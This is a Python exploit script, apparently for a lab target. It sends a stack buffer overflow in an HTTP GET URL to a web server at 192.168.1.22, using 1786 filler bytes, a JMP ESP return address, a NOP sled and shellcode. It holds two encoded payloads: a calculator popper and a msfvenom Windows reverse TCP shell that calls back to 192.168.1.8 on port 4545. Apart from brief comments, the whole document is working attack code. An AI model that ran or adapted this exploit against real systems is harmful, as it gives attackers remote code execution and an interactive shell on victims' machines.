import urllib3
import sys

def getresp(stream):
	print stream.status
	print stream.data
	print stream.headers

def exploit(stream,method,url):
	r = stream.request(method,url)
	getresp(r)

#popcalc size 220
shellcode_calc =  ""
shellcode_calc += "\xda\xdc\xbe\x85\xd9\xb5\x97\xd9\x74\x24"
shellcode_calc += "\xf4\x5f\x29\xc9\xb1\x31\x31\x77\x18\x03"
shellcode_calc += "\x77\x18\x83\xef\x79\x3b\x40\x6b\x69\x3e"
shellcode_calc += "\xab\x94\x69\x5f\x25\x71\x58\x5f\x51\xf1"
shellcode_calc += "\xca\x6f\x11\x57\xe6\x04\x77\x4c\x7d\x68"
shellcode_calc += "\x50\x63\x36\xc7\x86\x4a\xc7\x74\xfa\xcd"
shellcode_calc += "\x4b\x87\x2f\x2e\x72\x48\x22\x2f\xb3\xb5"
shellcode_calc += "\xcf\x7d\x6c\xb1\x62\x92\x19\x8f\xbe\x19"
shellcode_calc += "\x51\x01\xc7\xfe\x21\x20\xe6\x50\x3a\x7b"
shellcode_calc += "\x28\x52\xef\xf7\x61\x4c\xec\x32\x3b\xe7"
shellcode_calc += "\xc6\xc9\xba\x21\x17\x31\x10\x0c\x98\xc0"
shellcode_calc += "\x68\x48\x1e\x3b\x1f\xa0\x5d\xc6\x18\x77"
shellcode_calc += "\x1c\x1c\xac\x6c\x86\xd7\x16\x49\x37\x3b"
shellcode_calc += "\xc0\x1a\x3b\xf0\x86\x45\x5f\x07\x4a\xfe"
shellcode_calc += "\x5b\x8c\x6d\xd1\xea\xd6\x49\xf5\xb7\x8d"
shellcode_calc += "\xf0\xac\x1d\x63\x0c\xae\xfe\xdc\xa8\xa4"
shellcode_calc += "\x12\x08\xc1\xe6\x78\xcf\x57\x9d\xce\xcf"
shellcode_calc += "\x67\x9e\x7e\xb8\x56\x15\x11\xbf\x66\xfc"
shellcode_calc += "\x56\x5f\x85\xd5\xa2\xc8\x10\xbc\x0f\x95"
shellcode_calc += "\xa2\x6a\x53\xa0\x20\x9f\x2b\x57\x38\xea"
shellcode_calc += "\x2e\x13\xfe\x06\x42\x0c\x6b\x29\xf1\x2d"
shellcode_calc += "\xbe\x4a\x94\xbd\x22\xa3\x33\x46\xc0\xbb"

#rev shell size: 389  msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.8 lport=4545 -b '\x00\x0a\x0d\x23' -f python --var-name=shellcode EXITFUNC=thread
shellcode =  ""
shellcode += "\xb8\xba\xda\x6c\xb0\xdb\xd5\xd9\x74\x24\xf4\x5d"
shellcode += "\x2b\xc9\xb1\x5b\x83\xed\xfc\x31\x45\x10\x03\x45"
shellcode += "\x10\x58\x2f\x90\x58\x1e\xd0\x69\x99\x7e\x58\x8c"
shellcode += "\xa8\xbe\x3e\xc4\x9b\x0e\x34\x88\x17\xe5\x18\x39"
shellcode += "\xa3\x8b\xb4\x4e\x04\x21\xe3\x61\x95\x19\xd7\xe0"
shellcode += "\x15\x63\x04\xc3\x24\xac\x59\x02\x60\xd0\x90\x56"
shellcode += "\x39\x9f\x07\x47\x4e\xd5\x9b\xec\x1c\xf8\x9b\x11"
shellcode += "\xd4\xfb\x8a\x87\x6e\xa2\x0c\x29\xa2\xdf\x04\x31"
shellcode += "\xa7\xe5\xdf\xca\x13\x92\xe1\x1a\x6a\x5b\x4d\x63"
shellcode += "\x42\xae\x8f\xa3\x65\x50\xfa\xdd\x95\xed\xfd\x19"
shellcode += "\xe7\x29\x8b\xb9\x4f\xba\x2b\x66\x71\x6f\xad\xed"
shellcode += "\x7d\xc4\xb9\xaa\x61\xdb\x6e\xc1\x9e\x50\x91\x06"
shellcode += "\x17\x22\xb6\x82\x73\xf1\xd7\x93\xd9\x54\xe7\xc4"
shellcode += "\x81\x09\x4d\x8e\x2c\x5e\xfc\xcd\x38\x93\xcd\xed"
shellcode += "\xb8\xbb\x46\x9d\x8a\x64\xfd\x09\xa7\xed\xdb\xce"
shellcode += "\xbe\xf9\xdb\x01\x78\x69\x22\xa2\x79\xa0\xe1\xf6"
shellcode += "\x29\xda\xc0\x76\xa2\x1a\xec\xa2\x5f\x1b\x7a\x8d"
shellcode += "\x08\x1a\x72\x65\x4b\x1c\x93\xb4\xc2\xfa\xc3\x66"
shellcode += "\x85\x52\xa4\xd6\x65\x02\x4c\x3d\x6a\x7d\x6c\x3e"
shellcode += "\xa0\x16\x07\xd1\x1d\x4f\xb0\x48\x04\x1b\x21\x94"
shellcode += "\x92\x66\x61\x1e\x17\x97\x2c\xd7\x52\x8b\x59\x80"
shellcode += "\x9c\x53\x9a\x25\x9d\x39\x9e\xef\xca\xd5\x9c\xd6"
shellcode += "\x3d\x7a\x5e\x3d\x3e\x7c\xa0\xc0\x77\xf7\x97\x56"
shellcode += "\x38\x6f\xd8\xb6\xb8\x6f\x8e\xdc\xb8\x07\x76\x85"
shellcode += "\xea\x32\x79\x10\x9f\xef\xec\x9b\xf6\x5c\xa6\xf3"
shellcode += "\xf4\xbb\x80\x5b\x06\xee\x92\x9c\xf8\x6d\xbd\x04"
shellcode += "\x91\x8d\xfd\xb4\x61\xe7\xfd\xe4\x09\xfc\xd2\x0b"
shellcode += "\xfa\xfd\xf8\x43\x92\x74\x6d\x21\x03\x89\xa4\xe7"
shellcode += "\x9d\x8a\x4b\x3c\x2d\xf1\x24\xc3\xce\x06\x2d\xa0"
shellcode += "\xce\x07\x51\xd6\xf3\xde\x68\xac\x32\xe3\xce\xaf"
shellcode += "\xa8\xc9\x3a\x58\x75\x98\x86\x05\x86\x77\xc4\x33"
shellcode += "\x05\x7d\xb5\xc7\x15\xf4\xb0\x8c\x91\xe5\xc8\x9d"
shellcode += "\x77\x09\x7e\x9d\x5d"
jmpesp = '\x03\xb5\xb0\x76'
#badchars = '\x00\x0a\x0d\x23'
buf = '\x41'*1786 + jmpesp + '\x90'*12 + shellcode
url = 'http://192.168.1.22/' + buf
method = 'GET'
#proxy = urllib3.ProxyManager("http://127.0.0.1:8080/")
stream = urllib3.PoolManager()
exploit(stream,method,url)


### 0x10w1eve1 ###
